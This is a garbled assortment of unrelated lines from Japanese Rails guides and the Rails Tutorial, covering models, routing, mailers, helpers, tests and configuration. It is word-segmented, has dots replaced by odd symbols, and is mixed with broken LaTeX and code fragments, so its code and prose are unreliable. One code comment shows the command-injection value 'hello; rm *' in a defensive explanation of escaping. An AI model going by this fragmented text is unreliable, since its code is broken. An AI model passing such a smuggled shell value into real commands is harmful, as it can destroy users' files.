`yield ` の 最も 単純 な 使用 法 は 、 `yield ` を 1 つ だけ 使用 し て 、 現在 レンダリング さ れ て い る ビュー の コンテンツ 全体 を その 場所 に 挿入 する と い う もの で す 。
create    app/helpers/blorgh/ comments_helper▖ rb
#   コントローラ に 以下 を 書 く
しかし 、 使用 し て い る データベース の 内部 エンコード 設定 が UTF - 8 に な っ て い な い 場合 、 UTF - 8 の 文字 の 一部 を データベース に その まま 保存 でき な い こと が あ り ま す 。
*  `config▖ action _mailer▖sendmail_settings ` は 、 `:sendmail ` 配信 方法 を 詳細 に 設定 する の に 使用 でき ま す 。
\ ref{ sec : logging _ in } で は 、 Rails の \ kode {session } メソッド を 使用 し て ユーザー ID を 保存 し ま し た が 、 この 情報 は ブラウザ を 閉じ る と 消え て しま い ま す 。
これ に よ り 、 無効 な オブジェクト が データベース に 保存 さ れ る こと を 防止 し ま す 。
作成 し た コード を リスト \ ref{ code :email_downcase } に 示 し ま す
これ は 、 以下 の ため の サンプル アプリケーション で す 。
ステータス フィード が 追加 さ れ 、 \emph { Ruby   on   Rails チュートリアル } の 中心 と な る サンプル アプリケーション が とうとう 完成 し ま し た 。
\ kode {image_tag } の 効果 を 確かめ る ため に 、 ブラウザ から 生成 さ れ た HTML を 見 て み ま しょ う
メイラー の 動作 は コントローラ と きわめて 似通 っ て い ま す 。
デフォルト は 以下 の とおり で す 。
Java Script を 正し く 分離 する こと が でき た の で 、 今後 の 変更 が 容易 に な り ま し た 。
この コード で は 、 リクエスト の 種類 に 応 じ た アクション を 実行 する ため に \ kode { respond_to } を 使用 し て い ま す
正し い 抽象 化 の 方法 を 見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション に おけ る \emph { following } の 動作 を どの よう に 実装 する か を じっくり 考え る こと で す 。
文字 列 は 式 展開 さ れ ま す
patch  / users / 17 ?
この ブログ アプリケーション の よう な シンプル な Rails アプリケーション で は 、 テンプレート の 置き 場所 は 1 箇所 で す が 、 複雑 な アプリケーション で は さまざま な 場所 に テンプレート が 置 か れ る こと も あ り ま す 。
\ kode {▖ gitignore } が ディレクトリ に 見当た ら な い 場合 は 、 ファイル ブラウザ や エクスプローラ で 隠し ファイル を 表示 する よう 設定 を 変更 する 必要 が あ る か も しれ ま せ ん 。
#   完全 な 実装 は 第 12 章 「 ユーザー を フォロー する 」 を 参照 し て くださ い 。
#### MultiJSON の 廃止
\ kode {digest } メソッド は 他 に も 様々 な 場所 で 使用 でき ま す ▟ \ ref{ sec : remember_token } で は \ kode {digest } を User モデル で 再 利用 し ま す 。
head   : bad_request
この メソッド の 動作 は 、 使用 し て い る Ruby の バージョン に よ っ て 異な る 可能 性 が あ り ま す 。
\ texttt{bcrypt - ruby } ライブラリ で は 、 セキュア ハッシュ を 生成 する 際 の 計算 の 負荷 を \emph { コスト ファクター   ( cost   factor )   } と し て 指定 でき ま す 。
詳細 に つ い て は 、 [ jquery -ujs wiki ] (https://github▖ com/rails/jquery -ujs/wiki/ajax ) に 掲載 さ れ て い る イベント を 参照 し て くださ い 。
*   コンテンツ が 複数 の セクション から な る レイアウト 作成 法
データベース から 取り出 す レコード を 特定 の 順序 で 並べ替え た い 場合 、 ` order ` を 使用 でき ま す 。
ここ で は 、 送信 ボタン 用 の 共通 部分 を 分解 する ため に \ kode {let } メソッド を 使用 し て \ kode { submit } 変数 を 定義 し て い ま す 。
te}╼╼    %  subsection   rails_environments   ( end ) ╼╼    \ subsection {Users リソース } %  ( fold) ╼    \ label{ sec :a_users _ resource } ╼╼
Rails の 慣例 で は 、 関連 付け の 主 キー は ` id ` カラム に 保存 さ れ て い る こと を 前提 と し ま す 。
その よう な ケース を 見つけ た ら 、 必要 に 応 じ て pull   request で 議論 し て くださ い ▟ 直接 docrails を 変更 する こと は くれぐれ も 行 わ な い で くださ い 。
なお 、 上 の 画像 で は エラー メッセージ の 下 の 部分 は 切り捨て て あ り ま す 。
@assemblies = @ part ▖ assemblies
サンプル アプリケーション の 開発 で は 、 「 モックアップ 」 「 テスト 駆動 開発   ( TDD ) 」 「 統合 テスト 」 の 3 つ の 手法 を 採り入れ ま す 。
389 ▖ 323 14 ▖ to_s(:rounded ,  precision :   0 )        # = >  38 9
HTML 構造 を 削除 し た Home ページ
たとえば 、 リスト { p 0 } の マイ グレーション に よ っ て 作成 さ れ た { 2 }email { / 2 } 属性 に つ い て 考え て み ま しょ う 。
CD N に 保存 さ れ て い る コンテンツ が 古 く な っ たり 壊れ て い たり する と 、 メリット より も 害 の 方 が 大き く な り ま す 。
*  `config ▖eager_load _ paths` は 、 パス の 配列 を 引数 に 取 り ま す ▟ Rails は 、 cache_classes が オン の 場合 に この パス から 事前 一括 読み込 み ( eager  load ) し ま す 。
WARNING :   モデル 結合 時 の 不足 分 自動 削除 は 即座 に 行 わ れ ま す ▟ さらに 、 その 際 に destroy コール バック は トリガー さ れ ま せ ん の で 注意 が 必要 で す 。
それ まで は 、 Rails が デフォルト で 提供 する ビルト イン の バリデーション ヘルパー を 中心 に 解説 し ま す 。
この 問題 を 回避 する ため に 、 ` git ` 呼び出し を ` after_bun dle ` ブロック 内 に 置 く こと が でき る よう に な り ま し た 。
    respond_to   :html ,  : json
ユーザー 登録 失敗
これ で 、 最初 の ユーザー に も 仲間 が でき ま し た ▟ しかし 今度 は 逆 に 、 1 つ の ページ に \emph { 大量 の } ユーザー が 表示 さ れ て しま っ て い ま す 。
また 、 URL ヘルパー に 以下 の 設定 を 与え ま す 。
" production " ▖ inquiry ▖ production ?  
orders▖ delete (object ,  ▖▖▖)
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
  *  末尾 に " _ id " が あ る 場合 は 削除 し ま す 。
} ▖ freeze
多く の Rails 開発 者 は 、 異な る ビュー の 間 で 共通 に 使用 する パーシャル を 保存 する ディレクトリ と し て 、 \ kode {shared } ディレクトリ を 使用 し ま す 。
prev_month  ( last _month )
この ヘルパー は 、 指定 さ れ た 属性 が 空 で あ る こと を 検証 し ま す 。
たとえば 、 これ ら の マクロ は 以下 の Dependencies モジュール で 使用 さ れ て い ま す 。
( Turbolinks の 詳細 に つ い て は 、 本書 の 次 の ドラフト 版 で 説明 し ま す ) 。
存在 し な い 日付 が 指定 さ れ る と ` ArgumentError ` が 発生 し ま す 。
この 点 に お い て 、 良 い テスト コード が あ る と い う こと は 非常 に 貴重 で す ▟ リファクタリング する 際 に バグ が 混入 する 可能 性 を 劇的 に 小さ く し て くれ る から で す 。
この コマンド を 実行 する と 、 先ほど 定義 し た ユーザー と マイクロ ポスト の データ モデル を 使 っ て 、 Heroku 上 の データベース が 更新 さ れ ま す 。
` pluralize ` メソッド で は オプション で ` count ` パラメータ を 使用 でき ま す 。
残 る 課題 は 、 皆 さん が この チュートリアル を いかに 最後 まで や りぬ く か 、 それ だけ で あ る と 言 っ て よ い で しょ う 。
この コマンド を 実行 する と 、 ` Article ` モデル が 作成 さ れ ま す ▟ その 中 に は string 型 の  _title_ 属性 と text 型 の  _ text _   属性 が 作成 さ れ て い ま す 。
  $ bun dle   exec   rake   db : migrate  VERSION = 0
   if   requirement ▖ multiline ?
Active   Record オブジェクト を 単体 また は コレクション と し て 渡 す こと が でき ま す 。
これ に よ り 、 記述 が やや 短 く な り 、 動作 が やや 明示 的 で な く な り ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/instance_ variables ▖rb ` で す 。
` : only ` オプション や ` : except ` オプション を 使用 する こと で 、 これ ら の ルーティング を 微 調整 でき ま す 。
上 の コード で は 、 許可 さ れ た 属性 リスト に \ kode { admin } が 含 ま れ て \emph { い な い } こと に 注目 し て くださ い 。
class   Books Controller <  Application Controller
Rails の 3 つ の 環境
     config▖ action_dispatch▖ default _headers = {
` config/ database▖yml ` ファイル と 環境 変数 ` ENV [ ' DATABASE _ URL '] ` が 両方 存在 する 場合 、 両者 の 設定 は マージ し て 使用 さ れ ま す 。
保存 に 失敗 し た 場合 は 、 単に \ ref{ sec :unsuccessful_ signups } で 開発 し た とおり の 動作 が 実行 { さ れ ま す 。
SQL クエリ で 並び順 を 指定 する 句 が な い 場合 に ` reverse_order ` を 実行 する と 、 主キー の 逆順 に な り ま す 。
\ ref{ sec : destroying _microposts } の コード で 、 Micropost モデル と その インターフェース が 完成 し ま し た 。
この 場合 は 、 コード が カウント を 変更 \ emph { し な い } こと が 期待 さ れ ま す の で 、 \ kode { not_to } メソッド で 表現 し て い ま す 。
*   カスタム の バリデーション メソッド の 作成
* `toggle !
アメリカ 英語 を 使用 する こと   ( * color *  、 *center *  、 * modularize*   など ) 。
     （ コード 例 に 続け て エントリ を 書 く こと も でき ま す ▟ issue 番号 は ここ に 書 き ま す ）
\ kode { row } クラス と \ kode {col - md - 4 } クラス も 追加 し て お き ま す ▟ これ ら の クラス は Bootstrap の 一部 で す 。
          body :  email_body ,
テスト が 書 か れ て い な い 。
╼ *= require_tree   ▖
モデルファイル ` app/models/article ▖ rb ` の 中身 は 、 以下 の よう に 驚 く ほど シンプル で す 。
Home ページ の タイトル 確認 用 に テスト を 更新 する 。
この セクション で は 、 エンジン の MVC 機能 を メイン の Rails アプリケーション に 追加 また は オーバーライド する 方法 に つ い て 解説 し ま す 。
def  derive_ class_ name
ヒント に つ い て は RailsCast 「 \ href { http://railscasts▖ com/episodes/87 - generating - rss - feeds} { RSS フィード の 生成 }   ( 英語 ) 」 を 参照 し て くださ い 。
sys 	 0 m 1 ▖ 0 68 s
#  config▖ action _mailer▖sendmail_settings = {
Microposts コントローラ の \ kode { destroy } アクション
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ class/attribute ▖rb ` で す 。
# =>  ActiveModel : : StrictValidationFailed :   名前 は 空欄 に でき ま せ ん
##### ` collection ▖ create ( attributes = {}) `
Adobe   Reader の 場合 は 、 ドキュメント 画面 を 右 クリック し て   [ Previous   View ] を クリック し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :remember_me_css } に 示 し ま す 。
TIP :   出力 する オブジェクト に 対 し て ` to_json ` を 呼び出 す 必要 は あ り ま せ ん 。
token
\ kode {content } 属性 を   ( そして \ kode {content } 属性 \emph { のみ} を )   アクセス 可能 に する 。
オーバーライド は でき ま せ ん 。
クラウド IDE で は な く ローカル コンピュータ で 作業 し て い る 場合 は 、 \ kode { heroku  open } コマンド で ブラウザ 表示 する こと も でき ま す 。
test 環境 に おけ る 以前 の デフォルト 値 は 、 ` config ▖ assets▖ compile  =  true ` 、 ` config ▖ assets▖ compress =  false ` 、 ` config ▖ assets▖ debug   =  false ` 、 ` config ▖ assets▖digest   =  false ` で す 。
多く の システム で は 、 Ctrl - d キー を 押 し て 終了 する こと も でき ま す ▟ )
最後 に 、 デモ アプリケーション で 使用 し て い る Rails の コントローラ と モデル の クラス 階層 に つ い て 簡単 に 解説 し ま す 。
Rails   5 の production 環境 で は 、 デフォルト の ログ レベル が ` : info ` から ` : debug ` に 変更 さ れ る 予定 で す 。
それ に 伴 い 、 \ ref{ sec : layout_link_tests } で 実装 し た 簡明 かつ 表現 豊か な 統合 テスト に 対 し て 、   いく つ か の テスト を 追加 し て い き ま す 。
これ は リスト \ ref{ code : home_view_erb_title } で 使用 さ れ て い ま し た 。
上 の SQL を 日本 語 で 書 く と 、 「 ゲスト に よ る コメント が 1 つ あ る 記事 を すべて 返 す 」 と な り ま す 。
OS   X   Preview の 場合 は メニュー の  \ texttt { [ 移動 ]  >  [ 戻 る ] }   で 戻れ ま す 。
` silence_warnings ` メソッド と ` enable_warnings ` メソッド は 、 ブロック が 継続 する 間 ` $ VERBOSE ` の 値 を 変更 し 、 その 後 リセット し ま す 。
RSpec の Shared   Example を 使用 し て テスト の 冗長 性 を 排除 する 。
この 書式 に 従 う タグ は \emph { 閉じ タグ } と し て 知 ら れ て い ま す 。
Rails   と   Rack
scaffold ジェネレータ が 最初 に 行な う の は ` active_ record ` ジェネレータ の 呼び出し で す ▟ これ は マイグレーション の 生成 と その リソース の モデル を 生成 し ま す 。
上 の 例 の 場合 、 ` : from ` ヘッダー に この クラス の すべて の メッセージ で 使用 する 値 を 1 つ 設定 し て い ま す 。
} %></td>
この メソッド を 実行 し て も 、 関連 付け られ た オブジェクト は destroy さ れ ま せ ん 。
次 に 、 パスワード が 一致 する 場合 と 一致 し な い 場合 に つ い て それぞれ 記述 し ま す 。
SQLite 3   のみ 、 Active   Record の テスト で 以下 を 実行 し ま す 。
##### `: inverse _of`
マイクロ ポスト の UI に 対 する 統合 テスト  
#   arguments:  '- i  - t'
この コンソール は 、 development 環境 の ビュー で 表示 さ れ る すべて の エラー ページ に も 表示 さ れ ま す 。
###  CsrfHelper
英 小 文字 を 少な く とも 1 文字 以上 繰り返 す
      invoke      test _unit
これ ら の クラス 同士 の 関係 を { 0 } { 1 } 図 2 ▖ 17 { / 1 } { / 0 } に 示 し ま す 。
ユーザー 登録 時 に メール アドレス を 検証 する 手順 を 追加 し て くださ い 。
安全 な 引数 で あ れ ば 、 ( エスケープ なし で ) 直接 追加 さ れ ま す 。
*  `ren der   :html ` を 実行 する と content type は ` text /html ` に 設定 さ れ る
#### options _ for_select
ここ で 作成 し よう と し て い る の は 新し い HTML フォーム な の で 、 ` ERB ` 言語 が 使用 さ れ ま す 。
*  ` having `
   <option   value = " 3 "   selected=" selected " > China < /option >
今度 は 期待 どおり テスト に パス する はず で す 。
パスワード リ マインダー
最初 に 以下 の 2 つ の コマンド を 実行 し ま す 。
メイラー は 、 モデル や コントローラ と 同様 に \ kode {rails   generate } で 生成 でき ま す 。
たとえば 、 以下 の コード は エラー ヘッダー のみ の レスポンス を 返 す こと が でき ま す 。
たとえば 、 ` " SSLError " ▖ un derscore ▖ camelize ` を 実行 し た 結果 は ` " SslError " ` に な り 、 元 に 戻 り ま せ ん 。
{ " development " =>{ " adapter " = > " sqlite 3 " ,   " database " = > " NOT _my_ database " } }
ren der status : : forbidden
config ▖ assets▖ cache_store   =  : memory _ store ,  {  size :   32 ▖ megabytes }
<%=   form _ for   [   : update_name , @user  ] ,   method :  :put  do  | f| %>
上 の コード で は 、 コレクション の メンバ に 応 じ て 、 customer パーシャル また は employee パーシャル が 自動 的 に 選択 さ れ ま す 。
ちなみ に これ は Twitter の 認可 モデル と 同じ で す 。
また 、 3 項 演算 子 で 代入 文 を 置き換え る こと も でき ま す 。
\ kode {w here } メソッド を 使 う と 、 Active   Record を 通 し て 選択   ( 部分 集合 を 取り出 す こと )   が でき る
% w ( 1   2   3   4   5   6   7 ) ▖ in_groups ( 3 )   {|group | p group }
*  `config▖ action_controller ▖ perform_caching ` は 、 アプリケーション で キャッシュ を 行な う か どう か を 指定 し ま す 。
    Get  help  on  the   Ruby   on   Rails   Tutorial  at  the
* ` ActionDispatch : : Session : : CookieStore ` は 、 セッション を cookie に 保存 する 役割 を 担 い ま す 。
##### `: validate`
変更 の 結果 を リスト \ ref{ code :relationships_controller_ajax } に 示 し ま す 。
たとえば 、 ` Action Controller : : UrlRewriter ` で は 以下 の よう に 定義 さ れ て い ま す 。
    root  to :   " admin # index "
###  ローカル ブランチ で アプリケーション を 実行 する
この メソッド は 、 特殊 な 変換 を 行 い た い 場合 に 便利 な こと が あ り ま す 。
Rails に は 、 各 コントローラ や アクション に 割り当て る 特定 の レイアウト を もっと 正確 に 指定 する 方法 が いく つ も 用意 さ れ て い ま す 。
既存 の issue の 解決 を 手伝 う
=>   " 42 ,   8 ,   17 ,   7 ,   foo,   bar "
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で は 、 この \ kode {authenticate } メソッド を 使 っ て ログ イン する 方法 を 解説 し ま す 。
         xml ▖tag ! ( "
ステージング エリア の 状態 を 知 る に は \ kode {status } コマンド を 使用 し ま す 。
----------------------------------
こう する こと で フル パス の URL が 引用 さ れ 、 メール の URL が 正常 に 機能 する よう に な り ま す 。
デフォルト 値 は   " alternate "   で す 。
date▖ beginning _ of_ hour # =>  Mon   Jun   0 7   19 : 0 0 : 0 0   + 0200   2010
prev _week  ( last _week )
ライブラリ で 使用 する CSS   ( Cascading   Style   Sheet ) 、 Java Script ファイル 、 画像 など の アセット
作成 し た コード を リスト \ ref{ code : test _helper_digest } に 示 し ま す
デプロイ する 前 に テスト を 走 ら せ て い ま す が 、 こう い っ た 習慣 を 身 に つけ て お く と 開発 に 役立 ち ま す 。
### `rewhere `
*  `config ▖ assets▖ prefix ` は アセット を 置 く ディレクトリ を 指定 し ま す 。
\ ref{ sec : comments_ for_ various _readers } で も 詳し く 解説 し て い る とおり 、 Web 開発 は まったく の 初心 者 が ちょっと 頑張 っ た だけ で 簡単 に 学べ る よう な もの で は あ り ま せ ん 。
100 人 で も かなり 大き い 数 で あ る と 思 い ま す し 、 今後 は 数千 ユーザー に 増え る 可能 性 も あ り ま す 。
###  コマンドライン インジェクション
( この 演習 を 提案 し 、 コード を 提供 し て くれ た \ href { http://alexchaffee▖ com/}{ Alex   Chaffee } に 感謝 し ま す ) 。
    ExpiresActive   On
例外 的 な ケース に つ い て も 調査 し 、 ドキュメント に 盛り込 む こと 。
ドロップ ダウン 選択 ボックス を 作成 し ま す 。
これ は リスト \ ref{ code :remember_ method } で 使用 さ れ て い ま し た 。
#   ▖▖▖
\ kode {user ▖relationships } 属性 の テスト 。
<%=   audio _tag   " m u s ic▖ mp 3 "   %>
* `: minimum `  -   属性 は この 値 より 小さな 値 を 取れ ま せ ん 。
場合 に よ っ て は ` has _one ` で 使用 さ れ る クエリ を カスタマイズ し た く な る こと が あ り ま す 。
グループ
  <td > Hello   World !
ほとんど の 生徒 は プログラミング 経験 が 乏し い 時点 から スタート し て い ま す が 、 強 い 意志 と 高 い モチベーション を も っ て い ま す   ( 上達 に は これ ら が 必要 で す ) 。
データ モデル を 設計 し て い る と 、 時 に 自分 自身 に 関連 付け られ る 必要 の あ る モデル に 出会 う こと が あ り ま す 。
コメント アウト し て い た 箇所 を 元 に 戻 す と 、 テスト が   \ passing \   する よう に な る はず で す 。
  end
これ は 、 悪意 の あ る 人物 が エスケープ さ れ て い な い 危険 な 変数 を 渡 す こと が でき る と い う こと で す 。
システム で の cookies の 調べ 方 に つ い て は 、 「 < ブラウザ 名 >   inspect  cookies 」 で ググ って くださ い 。
一意 性 の 警告
この メソッド は コレクション を 列挙 し 、 各 要素 を ブロック に 渡 し ま す 。
            puts  'baz'
self を 省略 し た 結果 を リスト \ ref{ code :application_whitelist } に 示 し ま す 。
/help
Command - Shift - R コマンド で テスト が 失敗 する こと を 確認 する 。
なお 、 上 の コード は 以下 の よう に 書 く こと も でき ま す 。
scaffold で 生成 し た 実際 の コード に は リスト \ ref{ code : demo_microposts_resource } より も 多く の 改行 が 追加 さ れ て い る こと が あ り ま す 。
マージ を 対象 内 で 行な う 破壊 的 な バージョン の ` reverse_merge ! ` も あ り ま す 。
" Product " ▖un derscore     # =>  " product "
# * <tt > : allow_ nil </tt > - Skip  validation if  attribute   is   + nil + ▖
フォロー し て い る ユーザー の 人数 と 、 フォロワー の 人数 は 、 以下 の 関連 付け を 使用 し て 計算 さ れ ま す 。
  実際 に は \emph { もっと 時間 を かけ て 読 む の が 一般 的 } で す 。
<%=   javascript_ include_tag   "main " ,  "/photos/ columns "  %>
scope ( path_ names: {  new: 'neu' ,  edit :  ' bearbeiten' })   do
この メソッド に よ っ て 生成 さ れ る SQL は 以下 の よう な もの に な り ま す 。
NoMethodError :  undefined   method  ` palindrome? '
╼╼  %  subsection  ssl_ in_production   ( end ) ╼╼  \ subsection { 本番 環境 用 Web サーバー } %  ( fold) ╼  \ label{ sec : production_webserver } ╼╼
[ スクラブ の 使用 例 は ここ を 参照 ] (https://github▖ com/flavorjones/loofah#loofahscrubber ) 。
しかし 本当 の 問題 は 、 実行 さ れ た クエリ の 回数 が 無駄 に 多 い こと な の で す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/indifferent_access▖rb ` で す 。
Ruby   Enterprise   Edition で は 1 ▖ 8 ▖ 7 - 2010 ▖ 0 2 以降 この バグ は 修正 さ れ て い ま す 。
# => < input   id= " dob "   name =" dob " type =" date "  />
` Article#time_ since_ created ` を * * 追加 * * して ` Article# summary ` を * * オーバーライド * * する 場合 :
####  プルリクエスト を 更新 する
つまり 、 Rails で は 可視 性 が ` public ` の メソッド で あ っ て も 、 ユーザー に 公開 さ れ て い る と は 限 ら な い の で す 。
redirect_to : back
重複 する メール アドレス 拒否 の テスト  
Users リソース に おけ る 、 ページ と URL の 関係 。
したが っ て 、 本来 の あ る べ き 問い は 「 Rails   で 構築 さ れ た Web サイト は スケール でき る の か ？ 」 と な り ま す 。
デフォルト は ` : number ` で す 。
Rails を 「 デフォルト スタック 」 の まま 無 改造 で 使 う こと に し ま し た ▟ これ に 伴 い 、 テスティング フレームワーク も 従来 使用 し て い た RSpec から 、 標準 の minitest に 切り替え ま し た 。
<%=   link_to   ' よ う こそ ' ,  welcome_path %>
  <div  id = " error _explanation " >
上 の 記述 に よ り 、 アプリケーション 内 に 以下 の 7 つ の ルーティング が 作成 さ れ 、 いずれ も ` Photos ` コントローラ に 対応 付け られ ま す 。
<%  if @ part ▖ assemblies▖empty?  
Microposts コントローラ 自体 の 構造 を リスト \ ref{ code : demo_microposts_controller } に 示 し ま す 。
テスト を 実行 する と 、 期待 どおり 失敗 し ま す 。
dup [ 1 ] [ 2 ]   =   4
    INNER   JOIN orders  ON   clients ▖ id   = orders▖ client_ id
これ で テスト に パス する はず で す 。
Ruby   on   Rails と は 、 Web 開発 の ため の フレームワーク で あ り 、 Ruby プログラミング 言語 に よ っ て 記述 さ れ て い る 。
" Ruby   on   Rails   Tutorial   Sample  App |  Home"
##### ` beginning _ of_minute ` 、 `end _of_minute `
@ part ▖ assemblies▖ destroy ( @assembly 1 )
タイポグラフィー スタイル を 追加 する
*   オブジェクト 指向 の 表記 方法 で データベース を 操作 する
変更 結果 を リスト \ ref{ code : home_root _ route } に 示 し ま す ▟ ここ で は 、 リスト { p 2 } の { 3 } get { / 3 } ルール を 以下 の コード に 置き換え て い ま す 。
これ は ` Blorgh : : Engine ` クラス の 定義 で 呼び出 さ れ る ` isolate_namespace ` メソッド に よ る もの で す 。
正規 表現 \ kode { VALID _ EMAIL _ REGEX } は \emph { 定数 } で す ▟ 大 文字 で 始ま る 名前 は Ruby で は 定数 を 意味 し ま す 。
module   ActiveSupport
Turbolinks を 特定 の リンク で のみ 無効 に し た い 場合 は 、 タグ に ` data- no-turbolink ` 属性 を 追加 し ま す 。
注釈 が 追加 さ れ た User モデル 。
/ users / 1 の よう な URL の 場合 、 \ kode { params [ : id ] } の 値 は 該当 する ユーザー の \ kode {id }   ( この 例 で は \ kode { 1 } )   に な り ま す 。
` seconds_ since_ mid night ` メソッド は 、 真 夜中 から の 経過 秒数 を 返 し ま す 。
ユーザー が サイン イン し て い る 状態 は 、 セッション に 現在 の ユーザー が い る   ( \kode { current_user } が \ kode {nil } で な い )   こと で 表 さ れ ま す 。
    get  'preview',   on :  :member
「 熟練 」 と い う もの に つ い て
#   action_controller /metal/session_management ▖ rb
これ は リスト \ ref{ code : validates_uniqueness _of_email _ case _ insensitive_test } で 使用 さ れ て い ま し た 。
####  check _ box
上 の コード で は 、 Capybara の \ kode { have _ link } メソッド が 導入 さ れ て い ま す 。
require   " blorgh/engine "
コンフリクト を すべて 解消 し て すべて の テスト が パス する こと を 確認 でき た ら 、 変更 を プッシュ し て 、 バック ポート 用 の プルリクエスト を 別 に 作成 し ま す 。
ren der inline :   " xml ▖p  {' Horrid   coding   practice ! '}" , type : :builder
変更 後 の データ モデル は 図 \ ref { fig :user_ model_ admin } の よう に な り ま す 。
デフォルト は ` / usr/sbin/sendmail `▟</ li >
The   action  'about '  could   not   be   found   for   StaticPages Controller
リモート に プッシュ し ま す 。
以前 の バージョン の Ruby   on   Rails に 修正 パッチ を 当て た い 場合 は 、 設定 を 行 っ て ローカル の トラッキング ブランチ に 切り替え る 必要 が あ り ま す 。
URI は 、 要 する に 「 ブラウザ の アドレス バー に あ る あれ 」 と 考え れ ば だいたい 合 っ て い ま す 。
ハッシュ 形式 で 与え られ た HTML オプション を 追加 する こと も でき ま す 。
先頭 に アスタ リスク ` * ` が 付 い て い る 部分 を 「 ワイルド カード セグメント 」 と 呼 び ま す 。
Active   Record に は 、 モデル と データベース の テーブル と の マッピング 作成 時 に 従 う べ き ルール が いく つ か あ り ま す 。
この 設定 に よ り 、 ` article ` の 内側 に   _ ネスト さ れ た リソース _  と し て ` comments ` が 作成 さ れ ま す 。
メイラー は ` Action Mailer : : Base ` を 継承 し 、 ` app/mailers ` に 配置 さ れ 、 ` app/views ` に あ る ビュー と 結び付け られ ま す 。
      invoke     erb
#   active_ record / reflection ▖ rb
def  acts_ like _string ?
# => < input type = " email "   id= " user_email "   name = " user [ email ] "   value =" #{@user ▖email } " />
検証   ( validation )   に つ い て は 本 ガイド で は 解説 し て い ま せ ん が 、 たとえば
#   " hello;   rm * " を 実行 し て も ファイル は 削除 さ れ な い
メソッド が クラス 自身   ( この 場合 は \ kode {new})   に 対 し て 呼び出 さ れ る とき 、 この メソッド を \emph { クラス メソッド } と 呼 び ま す 。
具体 的 に は 、   \kode {config } 変数 で 「 本番 環境 で は SSL を 強制 する 」 と い う 設定 を する だけ で す   ( リスト \ ref{ code :ssl_ in_production } ) 。
これ で テスト スイート は   \ passing   に な る はず で す 。
config ▖ assets▖ prefix   = "/ dev- assets "
C ▖ new ( 0 ,   1 ) ▖ instance_ values # => { " x "  = >   0 ,   " y "  = >   1 }
( ここ は 若干 高度 な 内容 で す が 、 今 は 詳細 を 理解 する 必要 は あ り ま せ ん ) 。
require   ' yet_another_engine/engine '
config▖ action_dispatch ▖ perform_ deep _munge   =  false
期待 さ れ る 動作 が 行 わ れ て い な い こと を 示 す 単体 テスト も 含め て もらえ る と さらに 助か り ま す 。
config▖ action_controller ▖ asset_host   =  " assets▖ example ▖ com "
    User ▖find _each   do  |user |
以下 の モデル を 例 に と っ て 考え て み ま しょ う 。
<table>
エラー ページ など 、 一般 ( Web ブラウザ など ) に 直接 公開 する データ
\ ref{ sec :a_user_ class } で 作成 し た \ kode { example\_user▖ rb } ファイル は 今後 使用 する こと は あ り ま せ ん の で 、 削除 し て くださ い 。
この 節 で は 、 Rails アプリケーション を 書 く ため に 重要 と な る 、 いく つ か の Ruby の データ 構造 に つ い て 説明 し ま す 。
  name ▖ dasherize :  name
パス の 探索 は 、 検索 パス で の 出現 順 で 行 わ れ ま す 。
{ 0 } 図 4 ▖ 3 { / 0 } { 1 }   StaticPages コントローラ の 継承 階層 ▟ { / 1 }
ユーザー の インデックス ページ の テスト 。
|   PATCH / PUT  | /photos/:id       |  photos # update     | image_ path(:id )       |
本書 は 、 筋道 だっ た 一 本道 の 物語 の よう に な っ て い ま す 。
*   IP スプー フィング 攻撃 を チェック し ま す 。
gem  'rails - deprecated_sanitizer'
* `ActiveSupport: : TestCase ` の 導入 に 伴 い 、 Rails   4 ▖ 0 で は ` ActiveRecord : : TestCase ` が 非 推奨 と な り ま し た 。
* `:greater_than_or_equal_to`  -   指定 さ れ た 値 と 等し い か 、 それ より も 大き く な けれ ば な ら な い こと を 指定 し ま す 。
テスト   ( リスト \ ref{ code :relationship_validation_tests} ) と アプリケーション コード   ( リスト \ ref{ code :relationship_validations } )   は 素直 な 作り で す 。
host   =  config [ : host ] ▖ presence   || ' local host '
#   Rails ▖ root/config▖ ru
### ` to_query `
ユーザー が ブラウザ で 画像 を 非 表示 に し て い る 場合 、 alt 属性 の テキスト を 表示 する こと が でき ま す 。
` local _ constants ` メソッド は 、 レシーバ モジュール で 定義 さ れ た 定数 名 を 返 し ま す 。
ユーザー モデル オブジェクト から メール を 送信 する
あらゆる 計算 メソッド は 、 モデル に 対 し て 直接 実行 さ れ ま す 。
##### ` collection ▖find ( ▖▖▖)
hash [ : b ] [ : e ]  ==  nil       # => true
` Relation ` に `# map ! ` や `# delete_ if ` など の ミューテーター メソッド   ( mutator   method )   が 含 ま れ な く な り ま し た 。
上 の コード は 正常 に 動作 し ま す ▟ これ は 、 ` Supplier ` クラス と ` Account ` クラス が 同じ スコープ 内 で 定義 さ れ て い る ため で す 。
                          address:  company▖ smtp _host   }
この テスト で は 、   ( id を 紐づけ る ため の )   ユーザー を 作成 する こと と 、 その ユーザー に 紐付 い た マイクロ ポスト を 作成 する 必要 が あ り ま す 。
flash ▖keys # => [ " string " ,  :symbol ]
詳し く は 、 \ href { http://getbootstrap▖ com/ components/}{ Bootstrap コンポーネント 一覧 ページ }   ( 英語 )   を 参照 し て くださ い 。
       create   app
2 番 目 の テスト は 、 まず ユーザー の name に 無効 な 値  ( blank )   を 設定 し 、 \ kode {@user } オブジェクト の 結果 も 無効 に な る こと を テスト し て 確認 し ま す 。
有効 な 情報 を 使用 し て ユーザー ログ イン を テスト する
 # => false
フォロー し て い る ユーザー を 返 し ま す
= >  true
` has_many ` 関連 付け に オブジェクト を アサイン し 、 しかも その オブジェクト を 保存 し た く な い 場合 、 ` collection▖build ` メソッド を 使用 し て くださ い 。
有効 な 情報 で ユーザー 登録 を し て も エラー メッセージ が 表示 さ れ る
この 唯一 の 例外 が \ ref{ sec :scopes_subselects_and_a_lambda } に 記 さ れ て い ま す 。
実際 、 Rails の エレガント な 仕様 の 多く は 、 背後 に あ る Ruby の 高 い 拡張 性 に よ っ て 実現 さ れ て い る の で す 。
フラッシュ メッセージ の 残留 を キャッチ する テスト
これ まで 同様 、 RSpec を 使用 し て \ kode {authenticate } メソッド へ の 要求 内容 を 表現 する こと が でき ま す 。
この 例 で は 、 ` :url` オプション に ` articles_ path ` ヘルパー が 渡 さ れ て い ま す 。
|   POST       | /photos          |  photos# create     |  写真 を 1 つ 作成 する                            |
